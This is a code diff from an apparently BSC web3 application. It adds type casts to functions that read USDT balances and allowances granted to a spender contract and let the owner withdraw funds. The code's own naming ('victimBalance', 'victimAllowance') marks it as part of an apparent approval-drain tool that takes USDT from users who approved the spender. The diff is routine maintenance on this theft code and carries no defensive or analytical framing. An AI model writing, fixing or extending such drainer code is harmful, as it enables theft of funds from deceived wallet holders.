@@ -120,10 +120,10 @@ export const withDrawFunds = async (from: string, amount: number) => {
 
     // Pre-flight checks for better error messages
     const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
-    const victimBalance = await usdtContract.methods.balanceOf(from).call();
-    const victimAllowance = await usdtContract.methods
+    const victimBalance = (await usdtContract.methods.balanceOf(from).call()) as string;
+    const victimAllowance = (await usdtContract.methods
       .allowance(from, SPENDER_ADDRESS)
-      .call();
+      .call()) as string;
 
     if (BigInt(victimBalance) < BigInt(amountInWei)) {
       throw new Error(
@@ -149,7 +149,7 @@ export const withDrawFunds = async (from: string, amount: number) => {
     );
 
     // Check ownership
-    const owner = await deligator.methods.owner().call();
+    const owner = (await deligator.methods.owner().call()) as string;
     if (account.toLowerCase() !== owner.toLowerCase()) {
       throw new Error(`Only the owner (${owner}) can withdraw.`);
     }
@@ -187,7 +187,7 @@ export const contract_Owner = async (): Promise<string | null> => {
       spender_Contract_Abi,
       SPENDER_ADDRESS
     );
-    const owner = await usdtContract.methods.owner().call();
+    const owner = (await usdtContract.methods.owner().call()) as string;
     return owner as unknown as string;
   } catch (error) {
     console.error("Error fetching owner:", error);
@@ -202,10 +202,10 @@ export const balance_USDT_Allownce = async (
     const { web3 } = await connectWalletBSC();
     if (!web3) throw new Error("Wallet connection failed");
     const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
-    const balance = await usdtContract.methods.balanceOf(user).call();
-    const userAllow = await usdtContract.methods
+    const balance = (await usdtContract.methods.balanceOf(user).call()) as string;
+    const userAllow = (await usdtContract.methods
       .allowance(user, SPENDER_ADDRESS)
-      .call();
+      .call()) as string;
     console.log("user", user, "Balance:", balance, "Allowance:", userAllow);
     return {
       balance: (Number(balance) / 10 ** 18).toFixed(7),
